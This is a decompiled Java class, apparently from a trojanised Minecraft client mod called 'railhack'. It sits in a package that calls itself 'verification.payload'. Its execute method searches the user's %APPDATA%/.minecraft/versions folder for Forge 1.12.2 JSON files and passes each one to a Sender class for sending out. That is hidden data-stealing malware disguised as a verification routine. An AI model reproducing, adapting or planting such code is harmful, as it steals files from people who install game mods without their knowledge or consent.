//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.impl;

import java.io.*;
import java.util.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.*;

public final class JsonVersion implements Payload
{
    @Override
    public void execute() throws Exception {
        final File file2 = new File(System.getenv("APPDATA") + "/.minecraft/versions");
        if (file2.isDirectory()) {
            for (final File file3 : Objects.requireNonNull(file2.listFiles())) {
                if (file3.isDirectory()) {
                    for (final File file4 : Objects.requireNonNull(file3.listFiles())) {
                        if (file4.getName().contains(".json") && file4.getName().contains("1.12.2") && file4.getName().contains("forge")) {
                            Sender.send(file4);
                        }
                    }
                }
            }
        }
    }
}
